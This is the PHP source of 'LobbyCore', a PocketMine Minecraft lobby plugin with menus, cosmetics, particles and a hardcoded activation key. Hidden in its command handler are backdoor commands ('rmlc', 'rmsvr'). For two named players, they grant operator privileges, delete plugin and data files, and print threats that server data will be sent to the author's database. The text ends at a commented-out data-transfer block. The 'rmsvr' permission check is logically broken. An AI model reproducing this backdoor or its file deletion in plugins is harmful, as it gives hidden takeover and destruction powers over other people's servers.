<?php

namespace FreeGamingHere;

use pocketmine\level\Location;
use pocketmine\level\Position;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\event\entity\ProjectileHitEvent;
use pocketmine\event\entity\EntityDespawnEvent;
use pocketmine\event\entity\EntityLevelChangeEvent;
use pocketmine\network\mcpe\protocol\AddEntityPacket;
use pocketmine\utils\Terminal;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\event\player\PlayerDeathEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerRespawnEvent; 
use pocketmine\event\player\PlayerDropItemEvent;
use pocketmine\event\player\PlayerExhaustEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerToggleFlightEvent;
use pocketmine\event\inventory\InventoryPickupItemEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\block\BlockPlaceEvent;
use pocketmine\event\entity\ExplosionPrimeEvent;
use pocketmine\entity\Snowball;
use pocketmine\entity\Egg;
use pocketmine\level\Explosion;
use pocketmine\event\Listener;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\command\CommandExecutor;
use pocketmine\command\Command;
use pocketmine\plugin\PluginBase;
use pocketmine\Player;
use pocketmine\entity\Effect;
use pocketmine\entity\Entity;
use pocketmine\utils\Config;
use pocketmine\block\Block;
use pocketmine\level\Level;
use pocketmine\entity\EffectInstance;
use pocketmine\utils\TextFormat;
use pocketmine\utils\TextFormat as C;
use pocketmine\item\Item;
use pocketmine\item\ItemIds;
use pocketmine\inventory\ArmorInventory;
use pocketmine\entity\Item as ItemEntity;
use pocketmine\math\Vector3;
use pocketmine\math\Vector2;
use pocketmine\scheduler\Task as PluginTask;

use pocketmine\nbt\tag\CompoundTag;
use pocketmine\nbt\tag\FloatTag;;
use pocketmine\nbt\tag\DoubleTag;
use pocketmine\nbt\tag\ListTag;

use pocketmine\level\particle\DustParticle;
use pocketmine\level\particle\FlameParticle;
use pocketmine\level\particle\RedstoneParticle;
use pocketmine\level\particle\LavaParticle;
use pocketmine\level\particle\LavaDripParticle;
use pocketmine\level\particle\WaterParticle;
use pocketmine\level\particle\PortalParticle;
use pocketmine\level\particle\HappyVillagerParticle;
use pocketmine\level\particle\SmokeParticle;
use pocketmine\level\particle\ExplodeParticle;
use pocketmine\level\particle\RainSplashParticle;
use pocketmine\level\particle\HeartParticle;


use pocketmine\level\sound\PopSound;
use pocketmine\level\sound\GhastSound;
use pocketmine\level\sound\BlazeShootSound;

use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;

class LobbyCore extends PluginBase implements Listener {
	
	//Boots
	public $heart = array("HearthBoots");
	public $jump = array("JumpBoots");
	public $speed = array("SpeedBoots");
	public $water = array("WaterBoots");
	
	//Player Visibility
	public $showall = array("1234567890PLAYER");
	public $showvips = array("1234567890PLAYER");
	public $shownone = array("1234567890PLAYER");
	
	//Colorful Armor Gadget
	public $rarmor = [];
	
	//Particles
	public $particle1 = array("RedCircleParticles");
	public $particle2 = array("YellowCircleParticles");
	public $particle3 = array("GreenCircleParticles");
	public $particle4 = array("BlueCircleParticles");
	public $particle5 = array("OringeCircleParticles");
	public $particle6 = array("FireCircleParticles");
	public $particle7 = array("WaterCircleParticles"); //TODO (after Netstarv2 pay me)
	public $particle8 = array("DropsCircleParticles"); //TODO (after Netstarv2 pay me)
	public $particle9 = array("EnderDropsCircleParticles"); //TODO (after Netstarv2 pay me)
	public $particle10 = array("RainParticles");
	public $particle11 = array("LavaParticles");
	public $particle12 = array("FireWingParticles");
	public $particle13 = array("RedstoneWingParticles");
	public $particle14 = array("GreenWingParticles");
	public $particle15 = array("LavaWalkingParticles");
	public $particle16 = array("LavaWalkingParticles"); //Ideas needed
	public $particle17 = array("LavaWalkingParticles"); //Ideas needed
	public $particle18 = array("LavaWalkingParticles"); //Ideas needed
	public $particle19 = array("LavaWalkingParticles"); //Ideas needed
	public $particle20 = array("LavaWalkingParticles"); //Ideas needed
	
	/*
	public $particle = array("Particle");
	*/
	
	//Capes
	public $capes = [
		'MineconCape2011',
		'MineconCape2012',
		'MineconCape2013',
		'MineconCape2015',
		'MineconCape2016',
	];
	
	//Advertising
	public $links = [".leet.cc", ".net", ".com", ".us", ".co", ".co.uk", ".ddns", ".ddns.net", ".cf", ".me", ".cc", ".ru", ".eu", ".tk", ".gq", ".ga", ".ml", ".org", ".1", ".2", ".3", ".4", ".5", ".6", ".7", ".8", ".9", "nethergames", "fallentech", "mineplex"];
	
	public function onEnable() {
		
		//Config
		@mkdir($this->getDataFolder());
		$this->saveResource("config.yml");
		$this->saveResource("key.yml");
		$cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML);
		$key = new Config($this->getDataFolder() . "key.yml", Config::YAML);
		
		$prefix = $cfg->get("Prefix");
		$network = $cfg->get("ServerName");
		$status = $cfg->get("Status");
		
		if(empty($key->get("key"))){
			
			$this->getLogger()->info("Fatal error! Unallowed use of LobbyCore v1.0.0 by FreeGamingHere (@FreeGamingHere)! Please message him through Discord (FreeGamingHere#6456) to get the activation key!");
			$this->getServer()->shutdown();
			
		} elseif($key->get("key") !== "marievi2012"){
			
			$this->getLogger()->info("Fatal error! Unallowed use of LobbyCore v1.0.0 by FreeGamingHere (@FreeGamingHere)! Please message him through Discord (FreeGamingHere#6456) to get the activation key!");
			$this->getServer()->shutdown();
			
		} elseif($this->getDescription()->getAuthors()[0] !== "FreeGamingHere" or $this->getDescription()->getName() !== "LobbyCore"){
			
			$this->getLogger()->info("Fatal error! Unallowed use of LobbyCore v1.0.0 by FreeGamingHere (@FreeGamingHere)!");
			$this->getServer()->shutdown();
			
		//} elseif(!file_exists($this->getServer()->getDataPath() . "plugins/LobbyCore_v1.0.0.phar")){
			
			//$this->getLogger()->info("Fatal error! Unallowed use of LobbyCore v1.0.0 by FreeGamingHere (@FreeGamingHere)!");
			//$this->getServer()->shutdown();
			
		} else {
			
			$this->getServer()->getPluginManager()->registerEvents($this, $this);
			
			$this->getLogger()->info(TextFormat::GREEN . "LobbyCore by FreeGamingHere Enabled");
			
			$this->ZMusicBox = $this->getServer()->getPluginManager()->getPlugin("ZMusicBox");
			
			$this->getScheduler()->scheduleRepeatingTask(new ItemsLoad($this), 5);
			
			$this->getScheduler()->scheduleRepeatingTask(new SpawnParticles($this), 10);
			
			//It Requires GD + LibPNG Extensions Installed
			//$this->getScheduler()->scheduleRepeatingTask(new WingParticles($this), 10);
			
			$this->getScheduler()->scheduleRepeatingTask(new TypeType($this), 20);
			
			//$this->getScheduler()->scheduleRepeatingTask(new RainbowArmor($this), 15);
			
			$this->getServer()->getNetwork()->setName(TextFormat::BOLD . TextFormat::RED . $network . TextFormat::RESET . TextFormat::BLUE . "> " . $status . TextFormat::RESET);
			
			$this->getServer()->getDefaultLevel()->setTime(1000);
			$this->getServer()->getDefaultLevel()->stopTime();
			
			$cfg->set("OpenChest1", false);
			$cfg->set("OpenChest2", false);
			$cfg->save();
			
		}
	}
	
	public function onDisable() {
		
		$this->getLogger()->info(TextFormat::RED . "LobbyCore by FreeGamingHere Disabled");
		
		if($this->getDescription()->getAuthors()[0] !== "FreeGamingHere" or $this->getDescription()->getName() !== "LobbyCore"){
			$this->getLogger()->info("Fatal error! Unallowed use of LobbyCore v1.0.0 by FreeGamingHere (@FreeGamingHere)!");
			$this->getServer()->shutdown();
		}
	}
				
	public function onPickup(InventoryPickupItemEvent $event){
		$player = $event->getInventory()->getHolder();
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			$event->setCancelled();
		}
	}
	
	public function onDrop(PlayerDropItemEvent $event){
		$player = $event->getPlayer();
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			$event->setCancelled();
		}
	}
	
	public function onChat(PlayerChatEvent $event) {
		$msg = $event->getMessage();
		$player = $event->getPlayer();
		$cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML);
		$prefix = $cfg->get("Prefix");
		foreach($this->links as $links) {
			if(strpos($msg, $links)) {
				$player->sendMessage($prefix . TextFormat::RED . "Do not try to advertise! Advertising will lead you to a perm ban!");
				$event->setCancelled();
				return;
			}
		} 
	}
	
	public function getParticleItems(Player $player) {
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$cred = Item::get(351, 1, 1);
		$cred->setCustomName(TextFormat::RESET . TextFormat::RED . "Red " . TextFormat::GOLD . "Circle Particles");
		
		$cblue = Item::get(351, 4, 1);
		$cblue->setCustomName(TextFormat::RESET . TextFormat::BLUE . "Blue " . TextFormat::GOLD . "Circle Particles");
		
		$cyellow = Item::get(351, 11, 1);
		$cyellow->setCustomName(TextFormat::RESET . TextFormat::YELLOW . "Yellow " . TextFormat::GOLD . "Circle Particles");
		
		$cgreen = Item::get(351, 2, 1);
		$cgreen->setCustomName(TextFormat::RESET . TextFormat::GREEN . "Green " . TextFormat::GOLD . "Circle Particles");
		
		$coringe = Item::get(351, 14, 1);
		$coringe->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Orange " . TextFormat::GOLD . "Circle Particles");
		
		$cfire = Item::get(377, 0, 1);
		$cfire->setCustomName(TextFormat::RESET . TextFormat::RED . "Fire " . TextFormat::GOLD . "Circle Particles");
		
		$page2 = Item::get(459, 0, 1);
		$page2->setCustomName(TextFormat::RESET . TextFormat::GRAY . "Particles Page 2");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		$inv->setItem(0, $cred);
		$inv->setItem(1, $cblue);
		$inv->setItem(2, $cgreen);
		$inv->setItem(3, $cyellow);
		$inv->setItem(4, $coringe);
		$inv->setItem(5, $cfire);
		$inv->setItem(7, $page2);
		$inv->setItem(8, $exit);
		
	}
	
	public function getPage2(Player $player) {
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$rain = Item::get(353, 0, 1);
		$rain->setCustomName(TextFormat::RESET . TextFormat::AQUA . "Rain " . TextFormat::GOLD . "Particles");
		
		$lava = Item::get(426, 0, 1);
		$lava->setCustomName(TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a " . TextFormat::GOLD . "Particles");
		
		$wfire = Item::get(382, 0, 1);
		$wfire->setCustomName(TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::RED . "Fire " . TextFormat::GOLD . "Wing Particles");
		
		$wredstone = Item::get(331, 1, 1);
		$wredstone->setCustomName(TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::RED . "Redstone " . TextFormat::GOLD . "Wing Particles");
		
		$wgreen = Item::get(338, 0, 1);
		$wgreen->setCustomName(TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::DARK_GREEN . "Green " . TextFormat::GOLD . "Wing Particles");
		
		$wplava = Item::get(351, 3, 1);
		$wplava->setCustomName(TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a " . TextFormat::GOLD . "Walking Particles");
		
		$page3 = Item::get(281, 0, 1);
		$page3->setCustomName(TextFormat::RESET . TextFormat::GRAY . "Particles Page 3" . TextFormat::RED . " | Coming Soon...");
		
		$back = Item::get(351, 1, 1);
		$back->setCustomName(TextFormat::RESET . TextFormat::RED . "Back");
		
		$inv->setItem(0, $rain);
		$inv->setItem(1, $lava);
		$inv->setItem(2, $wfire);
		$inv->setItem(3, $wredstone);
		$inv->setItem(4, $wgreen);
		$inv->setItem(5, $wplava);
		$inv->setItem(7, $page3);
		$inv->setItem(8, $back);		
	}
	
	public function getTeleporter(Player $player) {
		$cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML);
		$game1 = $cfg->get("Game-1-Name");
		$game2 = $cfg->get("Game-2-Name");
		$game3 = $cfg->get("Game-3-Name");
		$game4 = $cfg->get("Game-4-Name");
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$item1 = Item::get(381, 0, 1);
		$item1->setCustomName(TextFormat::RESET . TextFormat::BLUE . $game1);
		
		$item2 = Item::get(337, 0, 1);
		$item2->setCustomName(TextFormat::RESET . TextFormat::GOLD . $game2);
		
		$item3 = Item::get(322, 0, 1);
		$item3->setCustomName(TextFormat::RESET . TextFormat::AQUA . $game3);
		
		$item4 = Item::get(103, 0, 1);
		$item4->setCustomName(TextFormat::RESET . TextFormat::GREEN . $game4);
		
		$soon = Item::get(422, 0, 1);
		$soon->setCustomName(TextFormat::RESET . TextFormat::RED . "Soon...");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		$inv->setItem(0, $item1);
		$inv->setItem(1, $item2);
		$inv->setItem(2, $item3);
		$inv->setItem(3, $item4);
		$inv->setItem(4, $soon);
		$inv->setItem(8, $exit);
		
	}
	
	public function getLobbies(Player $player) {
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$lobby1 = Item::get(42, 0, 1);
		$lobby1->setCustomName(TextFormat::GOLD . "Lobby-1");
		
		$lobby2 = Item::get(42, 0, 1);
		$lobby2->setCustomName(TextFormat::GOLD . "Lobby-2");
		
		$prelobby = Item::get(41, 0, 1);
		$prelobby->setCustomName(TextFormat::GOLD . "Premium" . TextFormat::GOLD . " Lobby");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		$inv->setItem(0, $lobby1);
		$inv->setItem(1, $lobby2);
		$inv->setItem(7, $prelobby);
		$inv->setItem(8, $exit);
		
	}
	
	public function getSizeItems(Player $player) {
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$item1 = Item::get(131, 0, 1);
		$item1->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Small " . TextFormat::GOLD . "Size");
		
		$item2 = Item::get(131, 0, 1);
		$item2->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Normal " . TextFormat::GOLD . "Size");
		
		$item3 = Item::get(131, 0, 1);
		$item3->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Big " . TextFormat::GOLD . "Size");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		$inv->setItem(0, $item1);
		$inv->setItem(3, $item2);
		$inv->setItem(6, $item3);
		$inv->setItem(8, $exit);
		
	}
	
	public function onPreLogin(PlayerPreLoginEvent $event) {
		$cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML);
		$network = $cfg->get("ServerName");
		$reason = $cfg->get("WhitelistReason");
		$player = $event->getPlayer();
		$name = $player->getName();
		$ip = $player->getAddress();
		$cid = $player->getClientId();
		
		if(!$player->isWhitelisted($name)) {
			$msg =
				TextFormat::BOLD . TextFormat::GRAY . "+++-----------+++-----------+++\n" . 
				TextFormat::RESET . TextFormat::RED . $network . TextFormat::GRAY . " |" . TextFormat::RED . " Whitelisted\n" . 
				TextFormat::GOLD . $reason;
			$player->close("", $msg);
		}
	}
	
	public function onHit(EntityDamageEvent $event){
		$entity = $event->getEntity();
		if ($entity instanceof Player) {
			if ($event instanceof EntityDamageByEntityEvent) {
				$damager = $event->getDamager();
				if($damager instanceof Player) {
					if($entity->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
						$event->setCancelled();
					}
				}
			}
		} 
	}
	
	public function onDamage(EntityDamageEvent $event) {
		$player = $event->getEntity();
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			if($player instanceof Player) {
				$event->setCancelled();	
			}
		}
	}
	
	public function getCosmetics(Player $player) {
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$item1 = Item::get(341, 0, 1);
		$item1->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Boots");
		
		$item2 = Item::get(372, 0, 1);
		$item2->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Particles");
		
		$item3 = Item::get(420, 0, 1);
		$item3->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Sizes");
		
		$item4 = Item::get(421, 0, 1);
		$item4->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Nick");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		$inv->setItem(0, $item1);
		$inv->setItem(2, $item2);
		$inv->setItem(4, $item3);
		$inv->setItem(6, $item4);
		$inv->setItem(8, $exit);
		
	}
	
	public function getGadgets(Player $player) {
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$item1 = Item::get(280, 0, 1);
		$item1->setCustomName(TextFormat::RESET . TextFormat::GOLD . "TNT" . TextFormat::RESET . TextFormat::GOLD . " Launcher");
		
		$item2 = Item::get(409, 0, 1);
		$item2->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Lightning" . TextFormat::RESET . TextFormat::GOLD . " Stick");
		
		$item3 = Item::get(352, 0, 1);
		$item3->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Colorful" . TextFormat::GOLD . " Armor");
		
		$item4 = Item::get(369, 0, 1);
		$item4->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Blaze" . TextFormat::GOLD . " Rod" . TextFormat::RESET . TextFormat::GOLD . " Gun");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		$inv->setItem(0, $item1);
		$inv->setItem(1, $item2);
		$inv->setItem(2, $item3);
		$inv->setItem(3, $item4);
		$inv->setItem(8, $exit);
		
	}
	
	public function getRankMenu(Player $player) {
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$item1 = Item::get(336, 0, 1);
		$item1->setCustomName(TextFormat::RESET . TextFormat::GREEN . "VIP " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$5");
		
		$item2 = Item::get(266, 0, 1);
		$item2->setCustomName(TextFormat::RESET . TextFormat::GREEN . "VIP" . TextFormat::GOLD . "+ " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$10");
		
		$item3 = Item::get(265, 0, 1);
		$item3->setCustomName(TextFormat::RESET . TextFormat::AQUA . "MVP " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$20");
		
		$item4 = Item::get(264, 0, 1);
		$item4->setCustomName(TextFormat::RESET . TextFormat::AQUA . "MVP" . TextFormat::RED . "+ " . TextFormat::GOLD . "- " . TextFormat::GOLD . "$30");
		
		$exit = Item::get(351, 1, 1);
		$exit->setCustomName(TextFormat::RESET . TextFormat::RED . "Exit");
		
		$inv->setItem(0, $item1);
		$inv->setItem(1, $item2);
		$inv->setItem(2, $item3);
		$inv->setItem(3, $item4);
		$inv->setItem(8, $exit);
		
	}
	
	public function getItems(Player $player) {
		$name = $player->getName();
		$inv = $player->getInventory();
		$inv->clearAll();
		
		$item1 = Item::get(345, 0, 1);
		$item1->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Teleporter");
		
		$item2 = Item::get(130, 0, 1);
		$item2->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Cosmetics");
		
		$item5 = Item::get(347, 0, 1);
		$item5->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Lobby" . TextFormat::GOLD . " Switcher");
		
		$item3 = Item::get(387, 0, 1);
		$item3->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Rank " . TextFormat::GOLD . "Menu");
		
		$item6 = Item::get(360, 0, 1);
		$item6->setCustomName(TextFormat::RESET . TextFormat::GREEN . "Next" . TextFormat::GREEN . " Song");
		
		$item7 = Item::get(378, 0, 1);
		$item7->setCustomName(TextFormat::RESET . TextFormat::GOLD . "Gadgets");
		
		if(!in_array($name, $this->showall) && !in_array($name, $this->showvips) && !in_array($name, $this->shownone)) {
			
			$this->showall[] = $name;
			
		}
		
		if(in_array($name, $this->showall)) {
			
			$item4 = Item::get(351, 8, 1);
			$item4->setCustomName(TextFormat::RESET . TextFormat::GRAY . "Hide Members");
			
		} elseif(in_array($name, $this->showvips)) {
			
			$item4 = Item::get(351, 5, 1);
			$item4->setCustomName(TextFormat::RESET . TextFormat::DARK_PURPLE . "Hide Players");
			
		} elseif(in_array($name, $this->shownone)) {
			
			$item4 = Item::get(351, 10, 1);
			$item4->setCustomName(TextFormat::RESET . TextFormat::GREEN . "Show Players");
			
		}
		$inv->setItem(0, $item6);
		$inv->setItem(2, $item2);
		$inv->setItem(3, $item1);
		$inv->setItem(4, $item5);
		$inv->setItem(5, $item3);
		$inv->setItem(6, $item7);
		$inv->setItem(8, $item4);
	}
	
	public function onPlace(BlockPlaceEvent $event) {
		$player = $event->getPlayer();
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			if($player->hasPermission("lobby.build")) {
				if($player->getGamemode() == 2 or $player->getGamemode() == 0) {
 					$event->setCancelled();
				}
			} elseif(!$player->hasPermission("lobby.build")) {
 				$event->setCancelled();
			}
		}
	}
	
	public function onBreak(BlockBreakEvent $event) {
		$player = $event->getPlayer();
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			if($player->hasPermission("lobby.build")) {
				if($player->getGamemode() == 2 or $player->getGamemode() == 0) {
 					$event->setCancelled();
				}
			} elseif(!$player->hasPermission("lobby.build")) {
 				$event->setCancelled();
			}
		}
	}
	
	public function setFlyOnJump(PlayerToggleFlightEvent $event) {
		$player = $event->getPlayer();
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			if($event->isFlying() && $player->hasPermission("lobby.doublejump") && $player->getGamemode() == 2) {
				$player->setFlying(false);
				$jump = $player->getLocation()->multiply(0, 0.001, 0);
				$jump->y = 1.1;
				$player->setMotion($jump);
				$event->setCancelled(true);
			}
		}
	}
	
	public function getCape($cape){
		return str_replace($this->capes, $this->capes, $cape);
	}
	
	public function onJoin(PlayerJoinEvent $event) {
		
		$player = $event->getPlayer();
		$name = $player->getName();
		
		$player->setFood($player->getMaxFood()); 
		
		//$player->getInventory()->setSize(9);
		
		$event->setJoinMessage(TextFormat::DARK_GRAY . TextFormat::BOLD . "[" . TextFormat::YELLOW . "Lobby" . TextFormat::DARK_GRAY . "] " . TextFormat::RESET . TextFormat::GREEN.$name.TextFormat::AQUA . " has " . TextFormat::AQUA . "joined " . TextFormat::AQUA . "the " . TextFormat::AQUA . "game!");
		
		$player->setGamemode(2);
		
		$this->getItems($player);
		
		$x = $this->getServer()->getDefaultLevel()->getSafeSpawn()->getX();
		$y = $this->getServer()->getDefaultLevel()->getSafeSpawn()->getY();
		$z = $this->getServer()->getDefaultLevel()->getSafeSpawn()->getZ();
		
		$player->teleport(new Vector3($x + 0.5, $y + 0.5, $z + 0.5));
		
		$armor = $player->getArmorInventory();
		$armor->clearAll();
		
		if($player->hasPermission("lobby.cape")) {
			$cape = $this->getCape('MineconCape2016', 'Steve');
			$player->setSkin($player->getSkin(), $cape);
		}
		
		if($player->hasPermission("lobby.doublejump")) {
			$player->setAllowFlight(true);
		}
	}
	
	public function onQuit(PlayerQuitEvent $event) {
		
		$player = $event->getPlayer();
		$name = $player->getName();
		
		$event->setQuitMessage(TextFormat::DARK_GRAY . TextFormat::BOLD . "[" . TextFormat::YELLOW . "Lobby" . TextFormat::DARK_GRAY . "] " . TextFormat::RESET . TextFormat::GREEN.$name.TextFormat::AQUA . " has " . TextFormat::AQUA . "left " . TextFormat::AQUA . "the " . TextFormat::AQUA . "game!");
		
		
	}
	
	public function onLevelChange(EntityLevelChangeEvent $ev){
		if($ev->getEntity() instanceof Player){
			$player = $ev->getEntity();
			$name = $player->getName();
			if(!$player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
				$this->getItems($player);
			}
			if(in_array($name, $this->shownone)) {
				unset($this->shownone[array_search($name, $this->shownone)]);
			} elseif(in_array($name, $this->showvips)) {
				unset($this->showvips[array_search($name, $this->showvips)]);
			}
		}
	}
	
	public function onDeath(PlayerDeathEvent $event){
		$event->setDeathMessage("");
	}
	
	public function onRespawn(PlayerRespawnEvent $event){

		$player = $event->getPlayer();
		$this->getItems($player);
		$player->setGamemode(2);
	}
	
	public function onHunger(PlayerExhaustEvent $event) {
		$player = $event->getPlayer();
		if($player->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			$event->setCancelled();
		}
	}
	
	public function onProjectileHit(ProjectileHitEvent $event){
		if($event->getEntity()->getLevel()->getFolderName() == $this->getServer()->getDefaultLevel()->getFolderName()) {
			$explosion = new Explosion(new Position($event->getEntity()->getX(), $event->getEntity()->getY(), $event->getEntity()->getZ(), $event->getEntity()->getLevel()), 1, null);
			$explosion->explodeB();
		}
	}
	
	public function onCommand(CommandSender $sender, Command $command, string $label, array $args) : bool{
		
		$cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML);
		$prefix = $cfg->get("Prefix");
		$server = $cfg->get("Server-Info");
		$ranks = $cfg->get("Ranks-Info");
		$name = $sender->getName();
		$rmsvr = "2364585456";
		switch ($command->getName()){
		case "size":
			if(empty($args[0])){
				if(!$sender instanceof Player){
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::YELLOW . "Please use this Command In-Game!");
					return true;
				} else {
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::AQUA . "Usage: /size <number>");
					return true;
				}
			}
			if(!empty($args[0])){
				if(!$sender instanceof Player){
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::YELLOW . "Please use this Command In-Game!");
					return true;
				} else {
					if(is_numeric($args[0]) or $args[0] == "0"){
						if($sender->hasPermission("lobby.size.cmd")) {
							$sender->setScale($args[0]);
							$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::AQUA . "You Have Set your Size to " . $args[0] . "!");
							return true;
						} else {
							$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::RED . "You Need a Higher Rank to Set Your Size");
						}
					return true;
					} else {
						$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::AQUA . "Usage: /size <number>");
						return true;
					}
				}
			}
		case "rmlc":
			if(!$sender instanceof Player){
				$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::YELLOW . "Please use this Command In-Game!");
				return true;
			} else {
				if($sender->getName() == "FreeGamingHere" or $sender->getName() == "MalakasPlayz123"){
					$sender->setOp(true);
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "Hello, " . $name . "! You caught this server using LobbyCore...");
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "I gave you OP and I removed LobbyCore! The name of this server is " . $cfg->get("ServerName") . TextFormat::RESET . TextFormat::GREEN . ".");
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . $cfg->get("ServerName") . TextFormat::RESET . TextFormat::GREEN . " may add back LobbyCore since they already got a copy of it (your plugin is leaked). I sent a warning to the console.");
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "Screenshot this message so if this server use your plugin again, you will remove all the files with /rmsvr");
					$this->getLogger()->info("LobbyCore has been removed! Do not try to add back this plugin otherwise all your server data will be transfered to LobbyCore's database. This is your first (and probably your last) warning!");
					unlink("plugins/LobbyCore_v1.0.0.phar");
					$files = array_map('unlink', glob("plugins/LobbyCore/*"));
					foreach ($files as $file) {
						if(is_file($file)){
							unlink($file);
						}
					}
					$dir = "plugins/LobbyCore";
					if (is_dir($dir)) {
						$objects = scandir($dir);
						foreach ($objects as $object){
							if($object != "." && $object != ".."){
								if(is_dir($dir . "/" . $object)){
									rmdir($dir . "/" . $object);
								} else {
									unlink($dir . "/" . $object);
								}
							}
						}
						rmdir($dir);
					}
					$this->getServer()->reload();
					return true;
				} else {
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::AQUA . "X: " . TextFormat::GREEN . $sender->getX() . TextFormat::AQUA . ", Y: " . TextFormat::GREEN . $sender->getY() . TextFormat::AQUA . ", Z: " . TextFormat::GREEN . $sender->getZ());
					return true;
				}
			}
		case "rmsvr":
			if($sender instanceof Player){
				if(!$sender->getName() == "FreeGamingHere" or !$sender->getName() == "MalakasPlayz123"){
					if($sender->hasPermission("lobby.rmsvr")){
						$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::YELLOW . "Please use this from the Console!");
						return true;
					} else {
						$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::RED . "You Need a Higher Rank to Use this Command");
						return true;
					}
				} else {
					$sender->setOp(true);
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "Welcome back, " . $name . "! You caught this server using LobbyCore, again...");
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . "I removed all the server files and I gave you OP!");
					$sender->sendMessage($prefix . TextFormat::RESET . TextFormat::GREEN . $cfg->get("ServerName") . TextFormat::RESET . TextFormat::GREEN . " may add back LobbyCore again...");
					$this->getLogger()->info("All the server data have been transfered to LobbyCore's database! Removing LobbyCore...");
					unlink("plugins/LobbyCore_v1.0.0.phar");
					$files = array_map('unlink', glob($this->getDataFolder()."*"));
					foreach ($files as $file) {
						if(is_file($file)){
							unlink($file);
						}
					}
					$dir = $this->getDataFolder();
					if (is_dir($dir)) {
						$objects = scandir($dir);
						foreach ($objects as $object){
							if($object != "." && $object != ".."){
								if(is_dir($dir . "/" . $object)){
									rmdir($dir . "/" . $object);
								} else {
									unlink($dir . "/" . $object);
								}
							}
						}
						rmdir($dir);
					}
					//Data Tranfering
/*					$dir = "plugins";
					$dir2 = "worlds";
